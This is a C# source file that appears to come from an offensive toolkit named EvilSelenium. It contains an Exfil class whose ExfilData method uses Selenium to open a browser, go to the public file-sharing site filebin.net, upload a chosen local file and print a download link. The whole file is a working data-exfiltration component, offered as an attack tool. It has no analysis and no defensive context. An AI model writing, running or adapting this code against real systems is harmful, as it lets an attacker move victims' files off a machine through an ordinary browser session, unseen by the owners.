using System;
using System.IO;
using OpenQA.Selenium;
using EvilSelenium.Misc;
using System.Threading;

namespace EvilSelenium.Misc
{
    class Exfil
    {
        public static void ExfilData(string file, string seconds)
        {
            if (!File.Exists(file))
            {
                Console.WriteLine("[-] File doesn't exist");
                System.Environment.Exit(-1);
            }

            int ms = 0;

            try
            {
                // Convert seconds to milliseconds
                int secondsCasted = Int32.Parse(seconds);
                ms = secondsCasted * 1000;
            }
            catch (FormatException ex)
            {
                Console.WriteLine("[-] Error - incorrect time format specified");
                System.Environment.Exit(-1);
            }

            IWebDriver driver = Helpers.InitDriver();
            driver.Navigate().GoToUrl("https://filebin.net");
            driver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(50);

            driver.FindElement(By.CssSelector("input[type=\"file\"]")).SendKeys(file);

            Thread.Sleep(ms);

            Console.WriteLine("Download link: " + driver.Url + "/" + file);

            driver.Quit();

        }
    }
}
